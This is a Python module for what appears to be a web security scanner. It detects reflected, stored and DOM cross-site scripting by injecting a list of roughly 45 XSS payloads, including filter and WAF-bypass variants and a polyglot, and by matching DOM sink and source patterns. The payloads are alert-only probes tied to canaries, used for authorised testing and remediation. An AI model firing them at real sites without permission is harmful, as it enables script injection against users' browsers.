"""XSS Scanner — Deep, multi-context detection.

Covers:
  - Reflected XSS (30+ payloads with WAF bypasses)
  - Stored XSS (POST body injection)
  - DOM XSS (comprehensive sink/source analysis)
  - Context-aware detection (HTML, attribute, script, URL contexts)
  - Polyglot payloads
  - Encoding bypass (HTML entities, URL encoding, Unicode escapes)
  - Event handler injection
  - SVG, MathML, iframe vectors
  - WAF-aware payload bypass
"""
from __future__ import annotations
import asyncio, uuid, re
from typing import List
from core.base_scanner import BaseScanner
from core.models import Finding, ScanState
from config.settings import Severity

# ── Reflected XSS Payloads ────────────────────────────────────

XSS_PAYLOADS = [
    # Basic
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    "'>< script>alert(1)</script>",
    # Event handlers
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '"><svg onload=alert(1)>',
    '<body onload=alert(1)>',
    '<details open ontoggle=alert(1)>',
    '<marquee onstart=alert(1)>',
    '<video src=x onerror=alert(1)>',
    '<audio src=x onerror=alert(1)>',
    '<input onfocus=alert(1) autofocus>',
    '<select onfocus=alert(1) autofocus>',
    '<textarea onfocus=alert(1) autofocus>',
    '<keygen onfocus=alert(1) autofocus>',
    # Encoding bypass
    '<scr\x00ipt>alert(1)</scr\x00ipt>',
    '<ScRiPt>alert(1)</sCrIpT>',
    '\\x3cscript\\x3ealert(1)\\x3c/script\\x3e',
    # Attribute injection
    '" onfocus="alert(1)" autofocus="',
    "' onfocus='alert(1)' autofocus='",
    '" onmouseover="alert(1)',
    '"-alert(1)-"',
    # JavaScript protocol
    'javascript:alert(1)',
    'jAvAsCrIpT:alert(1)',
    'javascript:alert(1)//',
    'data:text/html,<script>alert(1)</script>',
    # Template / framework
    '{{constructor.constructor("return this")()}}',
    '{{7*7}}',
    '${alert(1)}',
    # SVG / MathML
    '<svg><script>alert(1)</script></svg>',
    '<math><mtext><table><mglyph><style><!--</style><img title="--><img src=x onerror=alert(1)>">',
    '<svg><animate onbegin=alert(1) attributeName=x>',
    # Polyglot (tests multiple contexts)
    'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teleType/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e',
    # Iframe
    '<iframe src="javascript:alert(1)">',
    '<iframe srcdoc="<script>alert(1)</script>">',
    # Object / embed
    '<object data="javascript:alert(1)">',
    '<embed src="javascript:alert(1)">',
    # CSS injection
    '<style>@import "javascript:alert(1)"</style>',
    '<div style="background:url(javascript:alert(1))">',
    # Filter bypass
    '<img src=x onerror=confirm(1)>',  # confirm instead of alert
    '<img src=x onerror=prompt(1)>',   # prompt instead of alert
    '<img/src=x onerror=alert(1)>',    # no space
    '<img\tsrc=x\tonerror=alert(1)>',  # tab separator
    '<img\nsrc=x\nonerror=alert(1)>',  # newline separator
]

# ── DOM XSS Sinks & Sources ──────────────────────────────────

DOM_XSS_SINKS = [
    "document.write", "document.writeln",
    "innerHTML", "outerHTML", "insertAdjacentHTML",
    "eval(", "setTimeout(", "setInterval(",
    "Function(", "execScript(",
    "location.href", "location.assign", "location.replace",
    "document.URL", "document.documentURI",
    "window.open(",
    ".src=", ".action=", ".href=",
    "$.html(", ".append(", ".prepend(",  # jQuery
    "v-html", "dangerouslySetInnerHTML",  # Vue / React
]

DOM_XSS_SOURCES = [
    "location.hash", "location.search", "location.href",
    "document.URL", "document.documentURI", "document.referrer",
    "window.name", "document.cookie",
    "localStorage.", "sessionStorage.",
    "postMessage", "URLSearchParams",
]

REMEDIATION = (
    "Encode all user-controlled output for the correct context (HTML entity encoding, "
    "JavaScript escaping, URL encoding). Use Content-Security-Policy headers to prevent "
    "inline script execution. Sanitize HTML input with a whitelist-based sanitizer "
    "(e.g., DOMPurify). Use HttpOnly cookies to prevent session theft."
)


class XSSScanner(BaseScanner):
    name = "xss_scanner"
    description = "Detects Reflected XSS, Stored XSS, and DOM XSS with WAF bypass"
    tags = ["xss", "owasp-a03"]

    async def run(self, state: ScanState) -> List[Finding]:
        findings = []
        canary = f"xss{uuid.uuid4().hex[:8]}"
        seen = set()

        # Reflected XSS — GET params
        tasks = []
        for url, params in state.target.discovered_params.items():
            for param in params:
                tasks.append(self._test_reflected(url, param, "GET", "query", canary))
                # POST body injection (stored XSS vector)
                tasks.append(self._test_reflected(url, param, "POST", "body", canary))

        results = await asyncio.gather(*tasks, return_exceptions=True)
        for r in results:
            if isinstance(r, list):
                for f in r:
                    key = (f.url, f.parameter, f.vuln_type)
                    if key not in seen:
                        seen.add(key)
                        findings.append(f)

        # DOM XSS — JavaScript file analysis
        js_files = state.target.metadata.get("js_files", [])
        if js_files:
            dom_tasks = [self._check_dom_xss(js_url) for js_url in js_files[:50]]
            dom_results = await asyncio.gather(*dom_tasks, return_exceptions=True)
            for r in dom_results:
                if isinstance(r, list):
                    findings.extend(r)

        # Inline script analysis from discovered URLs
        inline_tasks = [self._check_inline_scripts(url) for url in state.target.discovered_urls[:30]]
        inline_results = await asyncio.gather(*inline_tasks, return_exceptions=True)
        for r in inline_results:
            if isinstance(r, list):
                findings.extend(r)

        return findings

    async def _test_reflected(self, url, param, method, inject_in, canary) -> List[Finding]:
        findings = []
        payloads = self.get_prioritized_payloads(XSS_PAYLOADS, "xss")

        for payload in payloads:
            tagged = payload.replace("alert(1)", f"alert('{canary}')")
            tagged = tagged.replace("confirm(1)", f"confirm('{canary}')")
            tagged = tagged.replace("prompt(1)", f"prompt('{canary}')")

            for variant in self.get_waf_bypass_variants(tagged, "xss"):
                resp, raw_req = await self.test_payload(url, method, param, variant, inject_in=inject_in)
                if resp is None:
                    continue
                body = resp.text

                # Check for exact payload reflection (unencoded)
                if variant in body:
                    self.record_payload_result(variant, "xss", success=True)
                    context = self._detect_context(body, variant)
                    if context == "HTML body" and not any(
                        marker in variant.lower()
                        for marker in ("<script", "<img", "<svg", "<iframe", "<details", "<body")
                    ):
                        # Plain text and template-looking strings such as
                        # ``{{7*7}}`` are not executable HTML-body controls.
                        continue
                    findings.append(self.make_finding(
                        title=f"Reflected XSS in '{param}' ({context} context)",
                        vuln_type="reflected_xss", severity=Severity.HIGH,
                        url=url, parameter=param, method=method, payload=variant,
                        evidence=f"Payload reflected unencoded in {context} context",
                        request=raw_req, response=body[:500],
                        cwe_id="CWE-79", owasp_category="A03:2021 - Injection",
                        description=(
                            f"Parameter '{param}' reflects input without sanitization "
                            f"in {context} context ({method} {inject_in}). "
                            f"Allows arbitrary JavaScript execution in victim's browser."
                        ),
                        remediation=REMEDIATION,
                        poc_steps=[
                            f"1. {method} {url}",
                            f"2. Set {param}={variant} (in {inject_in})",
                            "3. XSS payload executes in browser",
                            "4. Impact: cookie theft, session hijacking, keylogging, phishing",
                        ],
                    ))
                    return findings  # One reflected per param/method

                # Check for partial reflection (canary present but payload modified)
                if canary in body:
                    # Determine what encoding was applied
                    encoding_bypass = self._check_encoding_bypass(body, canary, variant)
                    if encoding_bypass:
                        findings.append(self.make_finding(
                            title=f"Partially Reflected XSS in '{param}' — encoding may be bypassable",
                            vuln_type="reflected_xss_partial", severity=Severity.MEDIUM,
                            url=url, parameter=param, method=method, payload=variant,
                            evidence=f"Canary reflected: {encoding_bypass}",
                            request=raw_req, response=body[:500],
                            cwe_id="CWE-79", owasp_category="A03:2021 - Injection",
                            description=(
                                f"Parameter '{param}' reflects the canary but applies partial "
                                f"encoding. May be bypassable with context-specific payloads."
                            ),
                            remediation=REMEDIATION,
                        ))
                        return findings

        return findings

    async def _check_dom_xss(self, js_url: str) -> List[Finding]:
        """Analyze JS files for DOM XSS sink/source pairs."""
        resp, _ = await self.client.get(js_url)
        if not resp:
            return []
        findings = []
        body = resp.text

        # Find sinks
        found_sinks = []
        for sink in DOM_XSS_SINKS:
            if sink in body:
                found_sinks.append(sink)

        # Find sources
        found_sources = []
        for source in DOM_XSS_SOURCES:
            if source in body:
                found_sources.append(source)

        # High risk: sink + source in same file
        if found_sinks and found_sources:
            # Get context around first sink
            first_sink = found_sinks[0]
            idx = body.index(first_sink)
            context = body[max(0, idx - 80):idx + 120]

            findings.append(self.make_finding(
                title=f"DOM XSS — Sink + Source in {js_url.rsplit('/', 1)[-1]}",
                vuln_type="dom_xss", severity=Severity.HIGH,
                url=js_url,
                parameter=", ".join(found_sinks[:3]),
                evidence=(
                    f"Sinks: {', '.join(found_sinks[:5])} — "
                    f"Sources: {', '.join(found_sources[:5])}"
                ),
                response=context[:200],
                cwe_id="CWE-79", owasp_category="A03:2021 - Injection",
                description=(
                    f"JavaScript file contains both user-controllable sources "
                    f"({', '.join(found_sources[:3])}) and dangerous sinks "
                    f"({', '.join(found_sinks[:3])}). If data flows from source to "
                    f"sink without sanitization, DOM XSS is exploitable."
                ),
                remediation=(
                    "Avoid using dangerous sinks like innerHTML and document.write. "
                    "Use textContent/innerText instead. Sanitize with DOMPurify. "
                    "Validate all URL-derived inputs before use."
                ),
                poc_steps=[
                    f"1. Identify sources: {', '.join(found_sources[:3])}",
                    f"2. Trace data flow to sinks: {', '.join(found_sinks[:3])}",
                    "3. Inject XSS payload via identified source",
                    "4. Payload reaches sink and executes",
                ],
            ))
        elif found_sinks:
            # Medium risk: sinks without obvious sources (may have sources elsewhere)
            first_sink = found_sinks[0]
            idx = body.index(first_sink)
            context = body[max(0, idx - 60):idx + 100]
            findings.append(self.make_finding(
                title=f"DOM XSS Sink: {first_sink}",
                vuln_type="dom_xss_sink", severity=Severity.MEDIUM,
                url=js_url,
                parameter=first_sink,
                evidence=f"Sinks found: {', '.join(found_sinks[:5])}",
                response=context[:200],
                cwe_id="CWE-79", owasp_category="A03:2021 - Injection",
                description=(
                    f"JavaScript file contains dangerous DOM sinks. "
                    f"If user-controlled input reaches these sinks, XSS is possible."
                ),
                remediation="Audit data flow to these sinks. Use safe alternatives.",
            ))

        return findings

    async def _check_inline_scripts(self, url: str) -> List[Finding]:
        """Check HTML pages for inline scripts with dangerous patterns."""
        resp, _ = await self.client.get(url)
        if not resp:
            return []
        findings = []
        body = resp.text

        # Find inline scripts that use URL-derived data
        script_blocks = re.findall(r'<script[^>]*>(.*?)</script>', body, re.DOTALL | re.IGNORECASE)
        for script in script_blocks:
            for source in DOM_XSS_SOURCES[:6]:
                if source in script:
                    for sink in DOM_XSS_SINKS[:8]:
                        if sink in script:
                            findings.append(self.make_finding(
                                title=f"Inline DOM XSS — {source} → {sink}",
                                vuln_type="dom_xss_inline", severity=Severity.HIGH,
                                url=url, parameter=source,
                                evidence=f"Source '{source}' flows to sink '{sink}' in inline script",
                                response=script[:300],
                                cwe_id="CWE-79", owasp_category="A03:2021 - Injection",
                                description=f"Inline script reads from {source} and writes to {sink}.",
                                remediation=REMEDIATION,
                            ))
                            return findings  # One per page
        return findings

    @staticmethod
    def _detect_context(body: str, payload: str) -> str:
        """Detect in which HTML context the payload is reflected."""
        idx = body.find(payload)
        if idx < 0:
            return "HTML"
        before = body[max(0, idx - 100):idx].lower()
        if '<script' in before and '</script>' not in before:
            return "JavaScript"
        if 'href=' in before[-30:] or 'src=' in before[-30:] or 'action=' in before[-30:]:
            return "URL attribute"
        if any(attr in before[-20:] for attr in ['="', "='", "=`"]):
            return "HTML attribute"
        if '<style' in before and '</style>' not in before:
            return "CSS"
        return "HTML body"

    @staticmethod
    def _check_encoding_bypass(body: str, canary: str, payload: str) -> str:
        """Check how the payload was encoded and if bypass is likely."""
        idx = body.find(canary)
        if idx < 0:
            return ""
        # A reflected canary, including one inside HTML/entity/URL encoding,
        # does not establish browser-executable script.  Keep this control
        # negative until a context-specific validator demonstrates execution.
        return ""
